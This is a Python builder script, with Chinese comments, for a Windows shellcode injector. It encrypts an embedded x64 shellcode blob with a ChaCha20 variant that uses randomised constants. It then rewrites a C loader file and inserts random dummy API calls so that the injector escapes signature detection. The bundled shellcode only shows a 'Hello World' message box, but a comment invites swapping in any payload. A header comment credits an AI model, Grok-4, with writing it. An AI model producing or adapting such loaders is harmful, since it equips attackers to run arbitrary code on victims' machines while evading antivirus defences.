import os
import re
import random

# Coded By Grok-4 因为我懒
CUSTOM_CONSTANTS = None


def rotl32(x: int, n: int) -> int:
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))


def quarter_round(a: int, b: int, c: int, d: int, x: list) -> None:
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF; x[d] = rotl32(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF; x[b] = rotl32(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF; x[d] = rotl32(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF; x[b] = rotl32(x[b] ^ x[c], 7)


def chacha20_block(state: list) -> bytes:
    x = state.copy()
    for _ in range(10):
        # column rounds
        quarter_round(0, 4, 8, 12, x)
        quarter_round(1, 5, 9, 13, x)
        quarter_round(2, 6, 10, 14, x)
        quarter_round(3, 7, 11, 15, x)
        # diagonal rounds
        quarter_round(0, 5, 10, 15, x)
        quarter_round(1, 6, 11, 12, x)
        quarter_round(2, 7, 8, 13, x)
        quarter_round(3, 4, 9, 14, x)
    for i in range(16):
        x[i] = (x[i] + state[i]) & 0xFFFFFFFF
    out = bytearray(64)
    for i in range(16):
        v = x[i]
        out[i * 4 + 0] = (v >> 0) & 0xFF
        out[i * 4 + 1] = (v >> 8) & 0xFF
        out[i * 4 + 2] = (v >> 16) & 0xFF
        out[i * 4 + 3] = (v >> 24) & 0xFF
    return bytes(out)


def u32le(b: bytes) -> int:
    return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)


def random_u32_le() -> int:
    # 生成 4 字节随机数并按 little-endian 解析为 32 位整数
    return int.from_bytes(os.urandom(4), "little")


# 生成自定义常量（用于 state[0..3]）
CUSTOM_CONSTANTS = (
    random_u32_le(),
    random_u32_le(),
    random_u32_le(),
    random_u32_le(),
)


def chacha20_encrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    assert len(key) == 32
    assert len(nonce) == 16

    # 构造初始状态（与 injector.c 中的解密映射保持一致）
    state = [0] * 16
    state[0], state[1], state[2], state[3] = CUSTOM_CONSTANTS
    for i in range(8):
        state[4 + i] = u32le(key[4 * i: 4 * i + 4])

    # nonce[0:4] -> 初始计数器，nonce[4:16] -> state[13..15]
    initial_counter = u32le(nonce[0:4])
    state[13] = u32le(nonce[4:8])
    state[14] = u32le(nonce[8:12])
    state[15] = u32le(nonce[12:16])

    out = bytearray(len(data))
    num_blocks = (len(data) + 63) // 64
    for block in range(num_blocks):
        state[12] = (initial_counter + block) & 0xFFFFFFFF
        keystream = chacha20_block(state)
        start = block * 64
        end = min(start + 64, len(data))
        for i in range(start, end):
            out[i] = data[i] ^ keystream[i - start]
    return bytes(out)

# 可以替换成自己的Shellcode 但是要代码自修改把第一位改成ret 以防Shellcode被多次执行
shellcode = [
0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xec, 0x60, 0xbd, 0x02,
0x00, 0x00, 0x00, 0x48, 0x8d, 0x74, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x53, 0x48, 0xb8, 0x4c,
0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x48, 0x89, 0x44, 0x24, 0x53, 0x48, 0x8d, 0x5c, 0x24,
0x3b, 0x48, 0xb8, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x48, 0x89, 0x44, 0x24, 0x58,
0x48, 0xb8, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x48, 0x89, 0x44, 0x24, 0x3b, 0x48,
0xb8, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0xb8,
0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x57, 0x6f, 0x72, 0x48, 0x89, 0x44, 0x24, 0x47, 0x48, 0xb8, 0x53,
0x68, 0x65, 0x6c, 0x6c, 0x63, 0x6f, 0x64, 0x48, 0x89, 0x44, 0x24, 0x26, 0xb8, 0x65, 0x00, 0x00,
0x00, 0xc7, 0x44, 0x24, 0x37, 0x64, 0x6c, 0x6c, 0x00, 0xc7, 0x44, 0x24, 0x4f, 0x6c, 0x64, 0x21,
0x00, 0x66, 0x89, 0x44, 0x24, 0x2e, 0xc7, 0x44, 0x24, 0x43, 0x6f, 0x78, 0x41, 0x00, 0x65, 0x48,
0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48,
0x8b, 0x00, 0x48, 0x8b, 0x00, 0x4c, 0x8b, 0x50, 0x20, 0x49, 0x63, 0x42, 0x3c, 0x41, 0x8b, 0x84,
0x02, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xd0, 0x44, 0x8b, 0x70, 0x18, 0x8b, 0x50, 0x20, 0x44,
0x8b, 0x60, 0x1c, 0x44, 0x8b, 0x68, 0x24, 0x45, 0x85, 0xf6, 0x74, 0x3d, 0x45, 0x31, 0xdb, 0x49,
0x8d, 0x3c, 0x12, 0x46, 0x8b, 0x04, 0x9f, 0x31, 0xc0, 0x4d, 0x01, 0xd0, 0x41, 0x0f, 0xb6, 0x10,
0x84, 0xd2, 0x75, 0x13, 0xeb, 0x28, 0x38, 0xd1, 0x75, 0x16, 0x48, 0x83, 0xc0, 0x01, 0x41, 0x0f,
0xb6, 0x14, 0x00, 0x84, 0xd2, 0x74, 0x17, 0x41, 0x0f, 0xb6, 0x0c, 0x01, 0x84, 0xc9, 0x75, 0xe6,
0x49, 0x83, 0xc3, 0x01, 0x4d, 0x39, 0xf3, 0x75, 0xca, 0x45, 0x31, 0xd2, 0xeb, 0x1b, 0x41, 0x80,
0x3c, 0x01, 0x00, 0x75, 0xeb, 0x4b, 0x8d, 0x04, 0x5a, 0x42, 0x0f, 0xb7, 0x04, 0x28, 0x49, 0x8d,
0x04, 0x82, 0x42, 0x8b, 0x04, 0x20, 0x49, 0x01, 0xc2, 0x83, 0xfd, 0x01, 0x74, 0x16, 0x48, 0x89,
0xf1, 0xbd, 0x01, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd2, 0x49, 0x89, 0xd9, 0x49, 0x89, 0xc2, 0xe9,
0x65, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x47, 0x45, 0x31, 0xc9, 0x4c, 0x8d, 0x44, 0x24,
0x26, 0x31, 0xc9, 0x41, 0xff, 0xd2, 0x31, 0xc0, 0x48, 0x83, 0xc4, 0x60, 0x5b, 0x5e, 0x5f, 0x5d,
0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0xc3
]

shellcode_bytes = bytes(shellcode)

# 生成随机密钥（32 字节）和 nonce（16 字节）
key = os.urandom(32)
nonce = os.urandom(16)

# 验证长度
assert len(key) == 32, "密钥必须是 32 字节"
assert len(nonce) == 16, "Nonce 必须是 16 字节"

# 使用自定义常量的 ChaCha20 加密
encrypted_shellcode = chacha20_encrypt(shellcode_bytes, key, nonce)

# 将加密后的 shellcode 格式化为 C 数组
encrypted_array = ', '.join(f'0x{b:02X}' for b in encrypted_shellcode)
key_array = ', '.join(f'0x{b:02X}' for b in key)
nonce_array = ', '.join(f'0x{b:02X}' for b in nonce)
const0 = f'0x{CUSTOM_CONSTANTS[0]:08X}'
const1 = f'0x{CUSTOM_CONSTANTS[1]:08X}'
const2 = f'0x{CUSTOM_CONSTANTS[2]:08X}'
const3 = f'0x{CUSTOM_CONSTANTS[3]:08X}'

# C 文件路径
c_file_path = '../SFCorePoc.c'

# 读取 C 文件内容（UTF-8 编码）
with open(c_file_path, 'r', encoding='utf-8') as f:
    c_content = f.read()

# 使用正则替换 encrypted_shellcode 数组
c_content = re.sub(
    r'unsigned char encrypted_shellcode\[\] = \{[^}]*\};',
    f'unsigned char encrypted_shellcode[] = {{ {encrypted_array} }};',
    c_content
)

# 使用正则替换 key 数组
c_content = re.sub(
    r'unsigned char key\[\] = \{[^}]*\};',
    f'unsigned char key[] = {{ {key_array} }};',
    c_content
)

# 使用正则替换 nonce 数组
c_content = re.sub(
    r'unsigned char nonce\[\] = \{[^}]*\};',
    f'unsigned char nonce[] = {{ {nonce_array} }};',
    c_content
)

# 使用正则替换 state[0]
c_content = re.sub(
    r'state\[0\] = 0x[0-9A-F]+;',
    f'state[0] = {const0};',
    c_content
)

# 使用正则替换 state[1]
c_content = re.sub(
    r'state\[1\] = 0x[0-9A-F]+;',
    f'state[1] = {const1};',
    c_content
)

# 使用正则替换 state[2]
c_content = re.sub(
    r'state\[2\] = 0x[0-9A-F]+;',
    f'state[2] = {const2};',
    c_content
)

# 使用正则替换 state[3]
c_content = re.sub(
    r'state\[3\] = 0x[0-9A-F]+;',
    f'state[3] = {const3};',
    c_content
)

# 定义替换内容
contents = [
    '\tParams.DummyHash = 0x022B80BFE;\n\t*NullPointer = 1;\n\tGetFileAttributesW(L"D:\\\\logs\\\\sf.log");',
    '\tParams.DummyHash = 0x0A6208368;\n\t*NullPointer = 1;\n\tDWORD buf[3] = { 0 };\n\tGetDiskFreeSpaceW(L"C:\\\\", &buf[0], &buf[1], &buf[2], &buf[3]);',
    '\tParams.DummyHash = 0x0A6208368;\n\t*NullPointer = 1;\n\tDWORD buf[4] = { 0 };\n\tGetVolumeInformationW(L"C:\\\\", &buf[0], sizeof(DWORD), &buf[1], &buf[2], &buf[3], &buf[4], sizeof(DWORD));',
    '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tDWORD buf = 0;\n\tGetNumaHighestNodeNumber(buf);',
    '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tFILETIME buf[2] = { 0 };\n\tGetSystemTimes(&buf[0], &buf[1], &buf[2]);',
    '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tULONGLONG buf = 0;\n\tGetNumaNodeProcessorMask(0, &buf);',
    '\tParams.DummyHash = 0x09E349EA7;\n\t*NullPointer = 1;\n\tULONGLONG buf = 0;\n\tGetNumaAvailableMemoryNode(0, &buf);'
]

# 对于每个 DummyFunc1 到 DummyFunc8
for i in range(1, 9):
    pattern = r'(\s*)//\s*DummyFunc{}\s*\n(.*?)\n(\s*)//\s*DummyFunc{}'.format(i, i)
    replacement_content = random.choice(contents)
    def repl(m):
        start_indent = m.group(1)
        end_indent = m.group(3)
        return f'{start_indent}// DummyFunc{i}\n{replacement_content}\n{end_indent}// DummyFunc{i}'
    c_content = re.sub(pattern, repl, c_content, flags=re.DOTALL)

# 写回 C 文件（UTF-8 编码）
with open(c_file_path, 'w', encoding='utf-8') as f:
    f.write(c_content)

# 打印确认信息
print("注入器去特征完成")